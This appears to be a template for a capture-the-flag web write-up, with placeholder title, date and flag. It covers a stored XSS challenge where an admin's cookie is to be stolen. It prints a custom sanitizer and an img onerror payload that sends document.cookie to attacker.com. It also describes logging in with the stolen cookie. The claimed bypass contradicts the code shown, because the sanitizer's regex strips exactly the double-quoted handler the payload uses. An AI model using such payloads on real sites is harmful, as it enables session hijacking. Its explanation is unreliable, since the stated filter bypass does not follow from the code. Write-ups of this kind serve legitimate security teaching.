---
title: "Challenge Title"
date: "YYYY-MM-DD"
ctf: "CTF Name Year"
category: "web" # Options: web, crypto, pwn, rev, forensics, misc, osint
difficulty: "Medium" # Options: Easy, Medium, Hard
points: 100
tags: ["tag1", "tag2"]
author: "Tham Le"
solved: true
---

# Challenge Title

## Challenge Description
<!-- Brief description of the challenge, including any provided instructions -->

The website allows users to submit comments that are displayed to administrators. Your goal is to steal the admin's cookie.

## Analysis
<!-- Your thought process, insights, and analysis of the challenge -->

The website filters many common XSS payloads but has a vulnerability in how it handles image tags.

![Screenshot of the vulnerable website](images/screenshot.png)

## Exploitation
<!-- Step by step explanation of how you solved the challenge -->

By analyzing the source code, I found that the site uses a custom sanitization function:

```javascript
function sanitize(input) {
  // Remove script tags
  input = input.replace(/<script.*?>.*?<\/script>/gi, '');
  // Allow some tags but remove event handlers
  input = input.replace(/on\w+=".*?"/gi, '');
  return input;
}
```

However, this function doesn't handle all cases. I created the following payload:

```html
<img src="x" onerror="fetch('https://attacker.com/'+document.cookie)">
```

## Solution
<!-- Final solution, flag, and any important lessons -->

After submitting the payload, I received the admin's cookie at my server:

![Cookie capture](images/cookie-capture.png)

Using this cookie, I was able to authenticate as the admin and retrieve the flag: `flag{example_flag_here}`

## Lessons Learned
<!-- Key takeaways and technical lessons from the challenge -->

1. Always validate and sanitize user input thoroughly
2. Use proper context-aware sanitization libraries
3. Consider implementing a Content Security Policy
4. Avoid storing sensitive information in cookies when possible
